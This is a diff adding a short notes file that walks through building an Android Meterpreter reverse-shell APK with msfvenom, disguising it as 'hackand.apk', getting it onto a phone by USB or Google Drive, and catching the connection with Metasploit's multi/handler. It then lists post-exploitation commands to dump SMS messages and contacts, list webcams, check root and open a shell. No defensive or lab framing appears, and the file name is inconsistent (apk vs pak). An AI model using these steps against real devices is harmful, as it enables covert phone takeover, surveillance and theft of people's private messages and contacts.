@@ -1,0 +1,37 @@
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.233 LPORT=4444 R > hackand.apk 
+
+msfconsole 
+(
+use multi/handler
+or
+use exploit/multi/handler
+)
+set payload android/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.43.233
+set lport 4444
+exploit
+
+
+install or start hackand.pak in mobile or send by usb or google drive
+
+dump_sms
+dump_contacts
+check_root
+webcam_list
+app_list
+shell   (ls,whoami,pwd etc)
+help
+
+or
+
+dump_
+after dump you cant see all detail in kali linux
+cat contact_dump_23file on kali location are downloaded
+
+
+
+
+
+
+
